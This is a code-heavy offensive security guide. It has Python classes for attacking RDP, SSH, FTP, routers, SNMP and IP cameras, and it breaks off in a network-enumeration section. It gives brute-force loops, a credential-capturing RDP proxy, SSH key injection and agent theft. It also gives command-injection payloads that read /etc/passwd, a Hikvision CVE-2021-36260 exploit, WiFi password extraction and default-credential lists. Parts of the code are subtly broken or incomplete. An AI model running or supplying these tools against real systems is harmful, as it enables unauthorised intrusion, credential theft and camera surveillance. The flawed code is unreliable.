Network Exploitation, Hardware Hacking, and Malware Infrastructure
Table of Contents
Network Protocol Exploitation
Router and Infrastructure Attacks
IoT and CCTV Exploitation
Discovery and Enumeration
Data Exfiltration via Webhooks/APIs
C2 and Botnet Architecture
Proof of Concepts
1. Network Protocol Exploitation
RDP (Remote Desktop Protocol)
python
#!/usr/bin/env python3
"""
RDP Exploitation Framework
Demonstrates protocol vulnerabilities and attack vectors
"""

import socket
import ssl
import struct
import asyncio
from cryptography import x509
from cryptography.hazmat.primitives import hashes

class RDPExploit:
    """
    RDP Security Analysis
    
    Common Vulnerabilities:
    - CVE-2019-0708 (BlueKeep): Pre-auth remote code execution
    - CVE-2019-1181/1182 (DejaBlue): Heap overflow in RDP
    - Weak encryption: Standard RDP uses RC4 (broken)
    - CredSSP bypass: NLA (Network Level Authentication) bypasses
    - Pass-the-Hash: NTLM relay attacks
    
    Protocol Stack:
    - TPKT (RFC 1006): Transport layer
    - X.224: Connection protocol
    - T.125 MCS: Multipoint Communication Service
    - GCC: Global Conference Control
    - Core RDP: Virtual channels, encryption
    """
    
    def __init__(self, target, port=3389):
        self.target = target
        self.port = port
        self.sock = None
        
    def connect(self):
        """Establish RDP connection"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.target, self.port))
        
    def send_tpkt(self, data):
        """
        TPKT Header (4 bytes):
        - version (1): 0x03
        - reserved (1): 0x00
        - length (2): total packet length
        """
        length = 4 + len(data)
        header = struct.pack('>BBH', 3, 0, length)
        self.sock.send(header + data)
        
    def recv_tpkt(self):
        """Receive TPKT packet"""
        header = self.sock.recv(4)
        if len(header) < 4:
            return None
            
        version, reserved, length = struct.unpack('>BBH', header)
        data = self.sock.recv(length - 4)
        return data
        
    def check_bluekeep(self):
        """
        CVE-2019-0708 Detection
        Checks for vulnerable RDP implementation via channel bind
        """
        self.connect()
        
        # Send Connection Request (X.224)
        cr = self.build_connection_request()
        self.send_tpkt(cr)
        
        response = self.recv_tpkt()
        if not response:
            return False
            
        # Check for MS_T120 channel (triggers vulnerability)
        # Parse GCC Conference Create Response
        if b'MS_T120' in response or self.parse_channels(response):
            return True  # Potentially vulnerable
            
        return False
        
    def build_connection_request(self):
        """Build X.224 Connection Request PDU"""
        # X.224 CR-TPDU
        tpdu = bytes([
            0x01,  # LI (length indicator)
            0x00,  # CR (Connection Request)
            0x08,  # DST-REF
            0x00,  # SRC-REF
            0x00,  # Class and options
        ])
        
        # RDP Negotiation Request
        rdp_neg = bytes([
            0x01, 0x00,  # Type: TYPE_RDP_NEG_REQ
            0x00, 0x00,  # Flags
            0x00, 0x00, 0x08, 0x00,  # Length
            0x00, 0x00, 0x00, 0x00,  # Protocols (Standard + SSL + HYBRID)
        ])
        
        return tpdu + rdp_neg
        
    def parse_channels(self, data):
        """Parse virtual channels from GCC response"""
        # Look for MS_T120 channel (0x4D 0x53 0x5F 0x54 0x31 0x32 0x30)
        return b'MS_T120\x00' in data
        
    def brute_force_nla(self, username, password_list):
        """
        NLA (Network Level Authentication) Brute Force
        
        NLA uses CredSSP which wraps SPNEGO + TLS
        We must complete TLS handshake first, then NTLM
        """
        import ssl
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        for password in password_list:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target, self.port))
                
                # Wrap with TLS
                tls_sock = context.wrap_socket(sock)
                
                # Send CredSSP (SPNEGO)
                if self.try_credssp(tls_sock, username, password):
                    return (username, password)
                    
            except Exception as e:
                continue
                
        return None
        
    def try_credssp(self, tls_sock, username, password):
        """
        Attempt CredSSP authentication
        
        CredSSP Sequence:
        1. TSRequest (version, negoTokens, authInfo)
        2. SPNEGO token exchange
        3. TSCredentials with encrypted credentials
        """
        # Build TSRequest
        ts_request = self.build_ts_request(username, password)
        
        # Send
        length = len(ts_request)
        tls_sock.send(struct.pack('>I', length))
        tls_sock.send(ts_request)
        
        # Receive response
        resp_len = struct.unpack('>I', tls_sock.recv(4))[0]
        response = tls_sock.recv(resp_len)
        
        # Check for success (no error token)
        return b'error' not in response.lower()
        
    def build_ts_request(self, username, password):
        """Build CredSSP TSRequest structure"""
        # ASN.1 encoded TSRequest
        # Simplified - real implementation uses pyasn1
        from cryptography.hazmat.primitives.asymmetric import rsa
        
        # Generate ephemeral key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        # Build NTLMSSP_NEGOTIATE
        ntlm_negotiate = self.build_ntlm_negotiate()
        
        # Encrypt credentials with server's public key
        # (obtained from certificate)
        
        return ntlm_negotiate
        
    def build_ntlm_negotiate(self):
        """Build NTLMSSP_NEGOTIATE message"""
        # NTLMSSP signature
        signature = b'NTLMSSP\x00'
        
        # Message type: 1 (NEGOTIATE)
        msg_type = struct.pack('<I', 1)
        
        # Negotiate flags
        flags = struct.pack('<I', 
            0x00020000 |  # NTLMSSP_NEGOTIATE_56
            0x00080000 |  # NTLMSSP_NEGOTIATE_128
            0x20000000 |  # NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
            0x00008000 |  # NTLMSSP_NEGOTIATE_NTLM
            0x00002000    # NTLMSSP_NEGOTIATE_SIGN
        )
        
        # Domain and workstation (empty)
        domain_len = struct.pack('<H', 0)
        domain_max = struct.pack('<H', 0)
        domain_off = struct.pack('<I', 0)
        
        work_len = struct.pack('<H', 0)
        work_max = struct.pack('<H', 0)
        work_off = struct.pack('<I', 0)
        
        # Version (Windows 10)
        version = struct.pack('<BBH', 6, 3, 0)  # Major, Minor, Build
        version += struct.pack('<H', 0xF000)     # NTLM revision
        
        return signature + msg_type + flags + \
               domain_len + domain_max + domain_off + \
               work_len + work_max + work_off + version

class RDPMitM:
    """
    RDP Man-in-the-Middle Attack
    
    Intercepts RDP connections to capture credentials
    and session data
    """
    
    def __init__(self, listen_port=3389):
        self.listen_port = listen_port
        self.target_host = None
        
    async def start(self):
        """Start RDP proxy server"""
        server = await asyncio.start_server(
            self.handle_client,
            '0.0.0.0',
            self.listen_port
        )
        
        async with server:
            await server.serve_forever()
            
    async def handle_client(self, reader, writer):
        """Handle incoming RDP connection"""
        # Connect to real target
        target_reader, target_writer = await asyncio.open_connection(
            self.target_host, 3389
        )
        
        # Bidirectional proxy with logging
        await asyncio.gather(
            self.pipe(reader, target_writer, "client->server"),
            self.pipe(target_reader, writer, "server->client")
        )
        
    async def pipe(self, reader, writer, direction):
        """Proxy data with capture"""
        while True:
            data = await reader.read(4096)
            if not data:
                break
                
            # Log credentials if found
            self.analyze_traffic(data, direction)
            
            writer.write(data)
            await writer.drain()
            
    def analyze_traffic(self, data, direction):
        """Extract credentials from RDP traffic"""
        # Look for NTLMSSP_AUTH
        if b'NTLMSSP\x00\x03\x00\x00\x00' in data:
            print("[+] Found NTLM authentication")
            self.parse_ntlm_auth(data)
            
    def parse_ntlm_auth(self, data):
        """Parse NTLMSSP_AUTH message"""
        # Extract username, domain, NTLM response
        # Can be cracked offline or used for Pass-the-Hash
        pass
SSH Exploitation
python
#!/usr/bin/env python3
"""
SSH Exploitation Framework
Covers protocol vulnerabilities, key management, and post-exploitation
"""

import paramiko
import socket
import threading
import hashlib
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, dsa, ec

class SSHExploit:
    """
    SSH Security Analysis
    
    Vulnerabilities:
    - Weak algorithms: CBC mode ciphers, SHA-1 MACs, diffie-hellman-group1-sha1
    - User enumeration: Timing differences in authentication
    - Key management: Authorized_keys injection, known_hosts poisoning
    - Agent forwarding: Key theft via SSH_AUTH_SOCK
    - X11 forwarding: Xauthority cookie theft
    
    Protocol Versions:
    - SSH-1.99/2.0: Current standard
    - SSH-1.x: Deprecated, vulnerable to CRC32 compensation attack
    """
    
    def __init__(self, target, port=22):
        self.target = target
        self.port = port
        self.transport = None
        
    def enumerate_users(self, user_list):
        """
        SSH User Enumeration via timing attack
        
        OpenSSH < 8.7 leaks timing information:
        - Invalid user: Fast response (no password check)
        - Valid user: Slower (password hash computed)
        """
        results = []
        
        for username in user_list:
            timing = self.time_auth_attempt(username, "invalidpassword123")
            
            # Valid users take ~2x longer due to password hash
            if timing > 0.5:  # Threshold
                results.append(username)
                
        return results
        
    def time_auth_attempt(self, username, password):
        """Time authentication attempt"""
        import time
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        start = time.time()
        
        try:
            sock.connect((self.target, self.port))
            
            # Receive banner
            banner = sock.recv(1024)
            
            # Send SSH version
            sock.send(b'SSH-2.0-OpenSSH_8.9\r\n')
            
            # Wait for key exchange
            sock.recv(4096)
            
            # Send userauth request
            # This is where timing differs
            
        except:
            pass
            
        elapsed = time.time() - start
        sock.close()
        
        return elapsed
        
    def check_weak_algorithms(self):
        """Check for weak cryptographic algorithms"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target, self.port))
        
        # Receive banner
        banner = sock.recv(1024).decode()
        
        # Send KEX_INIT
        kex_init = self.build_kex_init()
        sock.send(kex_init)
        
        # Receive server's KEX_INIT
        response = sock.recv(4096)
        
        # Parse to find algorithms
        weak_kex = [
            b'diffie-hellman-group1-sha1',
            b'diffie-hellman-group-exchange-sha1',
        ]
        
        weak_ciphers = [
            b'aes128-cbc',
            b'aes192-cbc',
            b'aes256-cbc',
            b'3des-cbc',
            b'blowfish-cbc',
        ]
        
        weak_macs = [
            b'hmac-sha1',
            b'hmac-md5',
            b'hmac-sha1-96',
        ]
        
        vulnerabilities = []
        
        for alg in weak_kex + weak_ciphers + weak_macs:
            if alg in response:
                vulnerabilities.append(alg.decode())
                
        sock.close()
        return vulnerabilities
        
    def build_kex_init(self):
        """Build SSH KEX_INIT packet"""
        # SSH Binary Packet Protocol
        # uint32: packet_length
        # byte: padding_length
        # byte[n1]: payload; n1 = packet_length - padding_length - 1
        # byte[n2]: random padding; n2 = padding_length
        
        # KEX_INIT message
        msg_type = bytes([20])  # SSH_MSG_KEXINIT
        
        # Cookie (16 random bytes)
        import os
        cookie = os.urandom(16)
        
        # Name-lists for algorithms
        kex_algorithms = b'diffie-hellman-group14-sha256'
        server_host_key_algorithms = b'rsa-sha2-512,rsa-sha2-256,ssh-rsa'
        encryption_algorithms = b'aes256-gcm@openssh.com,chacha20-poly1305@openssh.com'
        mac_algorithms = b'hmac-sha2-512-etm@openssh.com'
        compression_algorithms = b'none'
        
        # Build payload
        payload = msg_type + cookie
        payload += self.string(kex_algorithms)
        payload += self.string(server_host_key_algorithms)
        payload += self.string(encryption_algorithms)  # c->s
        payload += self.string(encryption_algorithms)  # s->c
        payload += self.string(mac_algorithms)  # c->s
        payload += self.string(mac_algorithms)  # s->c
        payload += self.string(compression_algorithms)  # c->s
        payload += self.string(compression_algorithms)  # s->c
        payload += self.string(b'')  # languages c->s
        payload += self.string(b'')  # languages s->c
        payload += bytes([0])  # first_kex_packet_follows
        payload += struct.pack('>I', 0)  # reserved
        
        # Pad to block size
        block_size = 8
        padding_len = block_size - ((len(payload) + 5) % block_size)
        if padding_len < 4:
            padding_len += block_size
            
        packet = struct.pack('>I', len(payload) + padding_len + 1)
        packet += bytes([padding_len])
        packet += payload
        packet += os.urandom(padding_len)
        
        return packet
        
    def string(self, s):
        """SSH string encoding: uint32 length + bytes"""
        return struct.pack('>I', len(s)) + s
        
    def authorized_keys_injection(self, username, private_key):
        """
        Inject public key into authorized_keys
        
        Requires existing access via password or other means
        """
        # Connect with password
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Get public key from private
        public_key = private_key.public_key()
        public_key_str = public_key.public_bytes(
            encoding=serialization.Encoding.OpenSSH,
            format=serialization.PublicFormat.OpenSSH
        ).decode()
        
        # Append to authorized_keys
        cmd = f'echo "{public_key_str}" >> ~/.ssh/authorized_keys'
        stdin, stdout, stderr = client.exec_command(cmd)
        
        client.close()
        
    def steal_ssh_agent(self, session):
        """
        Extract keys from SSH agent
        
        SSH agent exposes UNIX socket at SSH_AUTH_SOCK
        """
        # Get agent socket path
        stdin, stdout, stderr = session.exec_command('echo $SSH_AUTH_SOCK')
        auth_sock = stdout.read().decode().strip()
        
        if not auth_sock:
            return None
            
        # List keys in agent
        stdin, stdout, stderr = session.exec_command('ssh-add -l')
        keys = stdout.read().decode()
        
        # To extract keys, we need to proxy agent requests
        # and capture the private key material
        
        return keys

class SSHHoneypot:
    """
    SSH Honeypot for credential harvesting
    """
    
    def __init__(self, bind_addr='0.0.0.0', bind_port=2222):
        self.bind_addr = bind_addr
        self.bind_port = bind_port
        self.server_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
    def start(self):
        """Start SSH honeypot server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.bind_addr, self.bind_port))
        sock.listen(100)
        
        print(f"[*] SSH Honeypot listening on {self.bind_addr}:{self.bind_port}")
        
        while True:
            client, addr = sock.accept()
            print(f"[+] Connection from {addr}")
            
            handler = threading.Thread(
                target=self.handle_connection,
                args=(client, addr)
            )
            handler.start()
            
    def handle_connection(self, client_sock, addr):
        """Handle SSH connection"""
        try:
            # Create Paramiko transport
            transport = paramiko.Transport(client_sock)
            
            # Add server key
            transport.add_server_key(self.server_key)
            
            # Set up fake auth
            server = FakeSSHServer()
            transport.start_server(server=server)
            
            # Accept any credentials
            channel = transport.accept(20)
            
            if channel:
                # Log credentials
                print(f"[+] Credentials from {addr}:")
                print(f"    Username: {server.username}")
                print(f"    Password: {server.password}")
                
                # Provide fake shell
                self.fake_shell(channel)
                
        except Exception as e:
            print(f"[-] Error: {e}")
            
    def fake_shell(self, channel):
        """Emulate Linux shell"""
        channel.send(b"Last login: Mon Jan  1 00:00:00 2024 from 10.0.0.1\r\n")
        channel.send(b"$ ")
        
        while True:
            data = channel.recv(1024)
            if not data:
                break
                
            command = data.decode().strip()
            
            # Respond to common commands
            responses = {
                'ls': 'file1.txt file2.txt\r\n',
                'whoami': 'root\r\n',
                'id': 'uid=0(root) gid=0(root) groups=0(root)\r\n',
                'pwd': '/root\r\n',
                'exit': '',
            }
            
            response = responses.get(command, f'{command}: command not found\r\n')
            channel.send(response.encode())
            channel.send(b"$ ")

class FakeSSHServer(paramiko.ServerInterface):
    """Fake SSH server that accepts all credentials"""
    
    def __init__(self):
        self.username = None
        self.password = None
        
    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED
        
    def check_auth_password(self, username, password):
        self.username = username
        self.password = password
        return paramiko.AUTH_SUCCESSFUL
        
    def check_auth_publickey(self, username, key):
        self.username = username
        return paramiko.AUTH_SUCCESSFUL
        
    def get_allowed_auths(self, username):
        return 'password,publickey'
FTP Exploitation
python
#!/usr/bin/env python3
"""
FTP Exploitation and Analysis
"""

import socket
import ftplib
import asyncio

class FTPExploit:
    """
    FTP Security Analysis
    
    Vulnerabilities:
    - Cleartext credentials (no encryption)
    - Anonymous access
    - Directory traversal (../)
    - Passive mode port scanning (FTP bounce)
    - Command injection via SITE EXEC
    - Buffer overflows in various implementations
    
    Protocol Commands:
    - USER/PASS: Authentication
    - PASV/PORT: Data connection setup
    - RETR/STOR: File transfer
    - LIST/NLST: Directory listing
    - SITE: Server-specific commands
    """
    
    def __init__(self, target, port=21):
        self.target = target
        self.port = port
        
    def enumerate_anonymous(self):
        """Check for anonymous FTP access"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=10)
            
            # Try anonymous login
            ftp.login('anonymous', 'anonymous@example.com')
            
            # List directory
            files = []
            ftp.retrlines('LIST', files.append)
            
            ftp.quit()
            return {'accessible': True, 'files': files}
            
        except Exception as e:
            return {'accessible': False, 'error': str(e)}
            
    def ftp_bounce_scan(self, bounce_server, target_ip, target_port):
        """
        FTP Bounce Attack (Port Scanning via FTP)
        
        Uses PORT command to make FTP server connect to arbitrary addresses
        Useful for bypassing firewall rules
        
        PORT syntax: PORT h1,h2,h3,h4,p1,p2
        where IP = h1.h2.h3.h4, Port = p1*256 + p2
        """
        try:
            # Connect to bounce server
            ftp = ftplib.FTP()
            ftp.connect(bounce_server, 21)
            ftp.login()
            
            # Set PORT to target
            ip_parts = target_ip.split('.')
            port_high = target_port // 256
            port_low = target_port % 256
            
            port_cmd = f"PORT {ip_parts[0]},{ip_parts[1]},{ip_parts[2]},{ip_parts[3]},{port_high},{port_low}"
            
            ftp.sendcmd(port_cmd)
            
            # Try LIST to trigger connection
            try:
                ftp.retrlines('LIST')
                return 'open'
            except:
                return 'closed/filtered'
                
        except Exception as e:
            return f'error: {e}'
            
    def directory_traversal(self, path='../../../../etc/passwd'):
        """
        Exploit directory traversal in FTP servers
        
        Common vulnerable patterns:
        - Not sanitizing ../ sequences
        - URL decoding after path check
        - Unicode normalization issues
        """
        ftp = ftplib.FTP()
        ftp.connect(self.target, self.port)
        ftp.login()
        
        # Try to retrieve file via traversal
        try:
            content = []
            ftp.retrlines(f'RETR {path}', content.append)
            return '\n'.join(content)
        except Exception as e:
            return str(e)
        finally:
            ftp.quit()
            
    def brute_force(self, user_list, pass_list):
        """FTP brute force"""
        for user in user_list:
            for password in pass_list:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(self.target, self.port, timeout=5)
                    ftp.login(user, password)
                    ftp.quit()
                    return (user, password)
                except:
                    continue
        return None
2. Router and Infrastructure Attacks
python
#!/usr/bin/env python3
"""
Router and Network Infrastructure Exploitation
"""

import requests
import socket
import struct
import hashlib
import base64
from urllib.parse import urljoin

class RouterExploit:
    """
    Common Router Vulnerabilities
    
    Attack Vectors:
    - Default credentials (admin/admin, admin/password)
    - Command injection in diagnostic pages (ping, traceroute)
    - CSRF on configuration changes
    - Unauthenticated configuration backup/restore
    - UPnP IGD port mapping abuse
    - TR-069/CWMP attacks
    - Firmware backdoors
    """
    
    def __init__(self, target_ip):
        self.target = target_ip
        self.session = requests.Session()
        self.session.timeout = 10
        
    def check_default_credentials(self):
        """Test common default credentials"""
        common_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', ''),
            ('root', 'admin'),
            ('user', 'user'),
        ]
        
        for username, password in common_creds:
            if self.try_login(username, password):
                return (username, password)
        return None
        
    def try_login(self, username, password):
        """Attempt login via various methods"""
        # HTTP Basic Auth
        try:
            resp = self.session.get(
                f'http://{self.target}/',
                auth=(username, password),
                timeout=5
            )
            if resp.status_code == 200:
                return True
        except:
            pass
            
        # Form-based auth
        try:
            login_data = {
                'username': username,
                'password': password,
                'action': 'login'
            }
            resp = self.session.post(
                f'http://{self.target}/login.cgi',
                data=login_data
            )
            if 'logout' in resp.text.lower() or resp.status_code == 302:
                return True
        except:
            pass
            
        return False
        
    def command_injection_ping(self, cmd):
        """
        Command injection via diagnostic pages
        
        Many routers have ping/traceroute pages that pass
        user input directly to system()
        """
        # Inject command into IP field
        # Example: 127.0.0.1; cat /etc/passwd
        # or: $(cat /etc/passwd)
        
        injection_payloads = [
            f'127.0.0.1; {cmd}',
            f'127.0.0.1 && {cmd}',
            f'127.0.0.1 | {cmd}',
            f'$({cmd})',
            f'`{cmd}`',
        ]
        
        for payload in injection_payloads:
            try:
                data = {
                    'ip_address': payload,
                    'submit': 'Ping'
                }
                resp = self.session.post(
                    f'http://{self.target}/diagnostics.cgi',
                    data=data
                )
                
                # Check if command output appears
                if 'root:' in resp.text or len(resp.text) > 1000:
                    return resp.text
            except:
                continue
                
        return None
        
    def extract_wifi_password(self):
        """Extract WiFi password from configuration"""
        # Try to access config backup
        try:
            resp = self.session.get(f'http://{self.target}/backupsettings.conf')
            if resp.status_code == 200:
                # Parse for WiFi keys
                import re
                psk = re.search(r'<KeyPassphrase>(.+?)</KeyPassphrase>', resp.text)
                if psk:
                    return psk.group(1)
        except:
            pass
            
        # Try to scrape from status page
        try:
            resp = self.session.get(f'http://{self.target}/wlsecurity.html')
            import re
            # Look for hidden password field or JavaScript variable
            pwd = re.search(r'var wpapskkey\s*=\s*["\'](.+?)["\']', resp.text)
            if pwd:
                return pwd.group(1)
        except:
            pass
            
        return None
        
    def upnp_port_mapping(self, external_port, internal_ip, internal_port):
        """
        UPnP IGD Port Mapping Abuse
        
        UPnP allows internal hosts to request port forwards
        without authentication. Can expose internal services.
        """
        import upnpclient
        
        try:
            # Discover UPnP devices
            devices = upnpclient.discover()
            
            for device in devices:
                if 'WANIPConnection' in device.service_map:
                    service = device.service_map['WANIPConnection']
                    
                    # Add port mapping
                    service.AddPortMapping(
                        NewRemoteHost='',
                        NewExternalPort=external_port,
                        NewProtocol='TCP',
                        NewInternalPort=internal_port,
                        NewInternalClient=internal_ip,
                        NewEnabled='1',
                        NewPortMappingDescription='',
                        NewLeaseDuration=0
                    )
                    return True
        except:
            pass
            
        return False

class SNMPExploit:
    """
    SNMP Enumeration and Exploitation
    """
    
    def __init__(self, target):
        self.target = target
        
    def enumerate_communities(self):
        """Brute force SNMP community strings"""
        common_communities = [
            'public', 'private', 'admin', 'cisco',
            'snmp', 'mikrotik', 'default', 'password'
        ]
        
        from pysnmp.hlapi import *
        
        for community in common_communities:
            try:
                for (errorIndication, errorStatus, errorIndex,
                     varBinds) in nextCmd(
                    SnmpEngine(),
                    CommunityData(community),
                    UdpTransportTarget((self.target, 161)),
                    ContextData(),
                    ObjectType(ObjectIdentity('1.3.6.1.2.1.1.1.0')),  # sysDescr
                    lexicographicMode=False
                ):
                    if errorIndication:
                        break
                    if errorStatus:
                        break
                        
                    # Success
                    return community
            except:
                continue
                
        return None
        
    def extract_sensitive_data(self, community):
        """Extract useful information via SNMP"""
        from pysnmp.hlapi import *
        
        data = {}
        
        # System info
        data['system'] = self.snmp_get(community, '1.3.6.1.2.1.1.1.0')
        
        # Interfaces
        data['interfaces'] = self.snmp_walk(community, '1.3.6.1.2.1.2.2.1')
        
        # TCP connections
        data['tcp_connections'] = self.snmp_walk(community, '1.3.6.1.2.1.6.13.1')
        
        # Running processes (HOST-RESOURCES-MIB)
        data['processes'] = self.snmp_walk(community, '1.3.6.1.2.1.25.4.2.1')
        
        # Installed software
        data['software'] = self.snmp_walk(community, '1.3.6.1.2.1.25.6.3.1')
        
        # Storage
        data['storage'] = self.snmp_walk(community, '1.3.6.1.2.1.25.2.3.1')
        
        return data
        
    def snmp_walk(self, community, oid):
        """SNMP walk implementation"""
        from pysnmp.hlapi import *
        
        results = []
        for (errorIndication, errorStatus, errorIndex,
             varBinds) in nextCmd(
            SnmpEngine(),
            CommunityData(community),
            UdpTransportTarget((self.target, 161)),
            ContextData(),
            ObjectType(ObjectIdentity(oid)),
            lexicographicMode=False
        ):
            if errorIndication or errorStatus:
                break
            for varBind in varBinds:
                results.append(str(varBind))
        return results
3. IoT and CCTV Exploitation
python
#!/usr/bin/env python3
"""
IoT and CCTV/IP Camera Exploitation
"""

import requests
import cv2
import socket
import struct
import base64

class CCTVExploit:
    """
    IP Camera Exploitation
    
    Common Vulnerabilities:
    - Default credentials (admin/admin, root/pass)
    - RTSP without authentication
    - ONVIF default users
    - Firmware backdoors (Hikvision, etc.)
    - Command injection in camera names
    - Unauthenticated snapshot URLs
    - CVE-2021-36260 (Hikvision command injection)
    - RTSP stream access (rtsp://user:pass@ip:554/stream1)
    """
    
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        
    def check_default_credentials(self):
        """Test common camera credentials"""
        camera_types = {
            'hikvision': [
                ('admin', '12345'),
                ('admin', 'admin'),
            ],
            'dahua': [
                ('admin', 'admin'),
                ('666666', '666666'),
            ],
            'axis': [
                ('root', 'pass'),
            ],
            'foscam': [
                ('admin', ''),
            ],
        }
        
        for brand, creds in camera_types.items():
            for username, password in creds:
                if self.try_login(brand, username, password):
                    return {
                        'brand': brand,
                        'username': username,
                        'password': password
                    }
        return None
        
    def try_login(self, brand, username, password):
        """Attempt login based on camera type"""
        if brand == 'hikvision':
            # ISAPI login
            try:
                resp = self.session.get(
                    f'http://{self.target}/ISAPI/Security/userCheck',
                    auth=(username, password),
                    timeout=5
                )
                return resp.status_code == 200
            except:
                pass
                
        elif brand == 'dahua':
            # RPC2 login
            try:
                login_data = {
                    "method": "global.login",
                    "params": {
                        "userName": username,
                        "password": password,
                        "clientType": "Web3.0"
                    }
                }
                resp = self.session.post(
                    f'http://{self.target}/RPC2',
                    json=login_data
                )
                return 'true' in resp.text
            except:
                pass
                
        return False
        
    def get_snapshot(self):
        """Try to get unauthenticated snapshot"""
        snapshot_urls = [
            f'http://{self.target}/snapshot.cgi',
            f'http://{self.target}/cgi-bin/snapshot.cgi',
            f'http://{self.target}/onvif-http/snapshot',
            f'http://{self.target}/Streaming/Channels/1/picture',
            f'http://{self.target}/cgi-bin/camera',
            f'http://{self.target}/video/mjpg.cgi',
        ]
        
        for url in snapshot_urls:
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200 and len(resp.content) > 1000:
                    return resp.content
            except:
                continue
                
        return None
        
    def rtsp_stream_url(self, username, password):
        """Generate RTSP stream URLs"""
        paths = [
            '/Streaming/Channels/101',  # Hikvision
            '/cam/realmonitor?channel=1&subtype=0',  # Dahua
            '/onvif1',  # Generic ONVIF
            '/live/ch00_0',  # Generic
            '/mpeg4/media.amp',  # Axis
            '/video.mp4',  # Generic
        ]
        
        urls = []
        for path in paths:
            urls.append(f'rtsp://{username}:{password}@{self.target}:554{path}')
            
        return urls
        
    def cve_2021_36260(self, command):
        """
        Hikvision Command Injection (CVE-2021-36260)
        
        Injection point in the firmware update endpoint
        """
        payload = f'<?xml version="1.0" encoding="UTF-8"?>' \
                  f'<language>' \
                  f'<languageType>$({command})</languageType>' \
                  f'</language>'
                  
        try:
            resp = self.session.put(
                f'http://{self.target}/SDK/language',
                data=payload,
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )
            return resp.text
        except Exception as e:
            return str(e)

class IoTScanner:
    """
    IoT Device Discovery and Enumeration
    """
    
    def __init__(self):
        self.common_ports = [23, 80, 443, 554, 8080, 8443, 8554, 37777]
        
    def discover_onvif(self, subnet):
        """
        Discover ONVIF-compliant cameras via WS-Discovery
        """
        import socket
        import struct
        
        # WS-Discovery multicast
        multicast_addr = '239.255.255.250'
        multicast_port = 3702
        
        probe_msg = '''<?xml version="1.0" encoding="UTF-8"?>
        <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
            <s:Header>
                <wsa:MessageID xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">uuid:uuid</wsa:MessageID>
                <wsa:To xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>
                <wsa:Action xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>
            </s:Header>
            <s:Body>
                <Probe xmlns="http://schemas.xmlsoap.org/ws/2005/04/discovery">
                    <Types xmlns:dp0="http://www.onvif.org/ver10/network/wsdl">dp0:NetworkVideoTransmitter</Types>
                </Probe>
            </s:Body>
        </s:Envelope>'''
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        
        # Send probe
        sock.sendto(probe_msg.encode(), (multicast_addr, multicast_port))
        
        devices = []
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                devices.append({
                    'ip': addr[0],
                    'response': data.decode()
                })
            except socket.timeout:
                break
                
        return devices
        
    def scan_shodan_query(self, query):
        """
        Generate Shodan search queries for IoT devices
        """
        queries = {
            'webcams': 'webcam has_screenshot:true',
            'rtsp': 'rtsp port:554',
            'hikvision': 'Hikcam device',
            'dahua': 'Dahua DVR',
            'axis': 'Server: AXIS',
            'unauth_onvif': 'onvif -authentication',
        }
        
        return queries.get(query, query)
4. Discovery and Enumeration
python
#!/usr/bin/env python3
"""
Network Discovery and Enumeration Framework
"""

import socket
import struct
import threading
import subprocess
import json
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *

class NetworkEnumerator:
    """
    Comprehensive network enumeration
    """
    
    def __init__(self, target_range):
        self.target_range = target_range
        self.results = {}
        
    def arp_scan(self):
        """
        ARP scanning for local network discovery
        
        Sends ARP who-has requests to discover live hosts
        """
        ans, unans = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.target_range),
            timeout=2,
            verbose=0
        )
        
        hosts = []
        for snd, rcv in ans:
            hosts.append({
                'ip': rcv.psrc,
                'mac': rcv.hwsrc,
                'vendor': self.get_mac_vendor(rcv.hwsrc)
            })
            
        return hosts
        
    def get_mac_vendor(self, mac):
        """Get vendor from MAC OUI"""
        oui = mac[:8].replace(':', '').upper()
        # Lookup in database or API
        return "Unknown"
        
    def tcp_syn_scan(self, ports=[22, 23, 80, 443, 445, 3389, 8080]):
        """
        TCP SYN (half-open) port scan
        
        Sends SYN, waits for SYN-ACK (open) or RST (closed)
        Never completes handshake (stealthier)
        """
        open_ports = {}
        
        def scan_port(ip, port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                return port
            return None
            
        hosts = self.arp_scan()
        
        for host in hosts:
            ip = host['ip']
            open_ports[ip] = []
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {
                    executor.submit(scan_port, ip, port): port
                    for port in ports
                }
                
                for future in futures:
                    result = future.result()
                    if result:
                        open_ports[ip].append(result)
                        
        return open_ports
        
    def service_banner_grab(self, ip, port):
        """Grab service banners"""
        banners = {
            21: self._ftp_banner,
